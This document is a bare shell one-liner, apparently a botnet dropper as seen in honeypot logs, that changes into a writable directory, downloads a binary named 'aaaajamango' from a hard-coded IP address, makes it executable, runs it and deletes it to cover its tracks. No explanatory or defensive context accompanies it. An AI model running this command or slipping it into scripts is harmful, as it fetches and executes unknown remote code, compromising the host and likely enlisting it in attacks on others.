cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aaaajamango; chmod +x aaaajamango; ./aaaajamango; rm -rf aaaajamango
